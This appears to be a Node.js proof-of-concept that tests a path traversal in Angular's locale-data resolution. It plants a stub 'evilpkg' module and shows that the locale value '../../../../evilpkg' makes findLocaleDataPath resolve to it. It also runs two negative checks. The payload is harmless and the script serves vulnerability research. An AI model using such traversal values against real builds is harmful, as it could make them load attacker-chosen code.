import { createRequire } from 'node:module';
import path from 'node:path';
import fs from 'node:fs';
const projectRoot = path.join(import.meta.dirname, 'project');
fs.mkdirSync(projectRoot + '/node_modules/evilpkg', { recursive: true });
fs.writeFileSync(projectRoot + '/node_modules/evilpkg/index.js', "export const marker = 'EVIL-INDEX-7c2f9b'; export function init(){ return 'evil-exec'; };\n");
fs.writeFileSync(projectRoot + '/package.json', '{"name":"fixture","private":true}');
const projectRequire = createRequire(projectRoot + '/');
const LOCALE_DATA_BASE_MODULE = '@angular/common/locales/global';
const key4 = '../../../../evilpkg';
const spec4 = path.join(LOCALE_DATA_BASE_MODULE, key4);
console.log('4-dot joined specifier:', JSON.stringify(spec4));
try {
  const p = projectRequire.resolve(spec4);
  console.log('4-dot resolved:', p);
  const content = fs.readFileSync(p, 'utf8');
  console.log('4-dot content has evil marker:', content.includes('EVIL-INDEX-7c2f9b'));
} catch (e) { console.log('4-dot THROWS:', e.code, String(e.message).slice(0, 140)); }
// findLocaleDataPath verbatim from i18n-webpack.ts L135-143
function findLocaleDataPath(locale, resolver) {
  const scrubbedLocale = locale.replace(/-x(-[a-zA-Z0-9]{1,8})+$/, '');
  try { return resolver(scrubbedLocale); } catch { return scrubbedLocale === 'en-US' ? findLocaleDataPath('en', resolver) : null; }
}
const p = findLocaleDataPath(key4, (l) => projectRequire.resolve(path.join(LOCALE_DATA_BASE_MODULE, l)));
console.log('findLocaleDataPath result:', p);
// negative: nonexistent bare name -> null (fallback, no crash)
const nullRes = findLocaleDataPath('../../../../nonexistentpkg', (l) => projectRequire.resolve(path.join(LOCALE_DATA_BASE_MODULE, l)));
console.log('negative nonexistent ->', nullRes);
// negative: benign locale 'fr' -> resolution failure (no @angular/common installed) -> null
const frRes = findLocaleDataPath('fr', (l) => projectRequire.resolve(path.join(LOCALE_DATA_BASE_MODULE, l)));
console.log('negative fr (no @angular/common installed) ->', frRes);
